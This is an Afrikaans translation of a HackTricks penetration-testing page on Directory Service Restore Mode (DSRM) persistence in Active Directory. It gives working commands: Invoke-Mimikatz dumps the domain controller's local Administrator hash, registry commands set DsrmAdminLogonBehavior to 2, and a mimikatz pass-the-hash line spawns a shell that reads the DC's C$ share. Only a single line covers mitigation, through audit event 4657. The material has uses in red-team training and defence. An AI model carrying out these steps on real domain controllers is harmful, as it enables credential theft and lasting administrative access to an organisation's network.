# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## Basiese Inligting

Daar is ’n **local administrator**-rekening binne elke **DC**. Met admin privileges op hierdie masjien kan jy mimikatz gebruik om die **local Administrator hash** te **dump**. Daarna kan jy ’n registry wysig om hierdie wagwoord te **activate**, sodat jy op afstand toegang tot hierdie local Administrator-gebruiker kan kry.\
Eers moet ons die **hash** van die **local Administrator**-gebruiker binne die DC **dump**:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Dan moet ons nagaan of daardie rekening sal werk, en as die registersleutel die waarde "0" het of nie bestaan nie, moet jy dit **op "2" stel**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Dan kan jy, met behulp van ’n PTH, **die inhoud van C$ lys of selfs ’n shell verkry**. Let daarop dat wanneer jy ’n nuwe PowerShell-sessie met daardie hash in die geheue skep (vir die PTH), **die "domain" wat gebruik word, slegs die naam van die DC-masjien is**:
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Meer inligting hieroor by: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) en [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>

## Versagting

- Gebeurtenis-ID 4657 - Oudit van skepping/wysiging van `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

## Verwysings

- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)

{{#include ../../banners/hacktricks-training.md}}
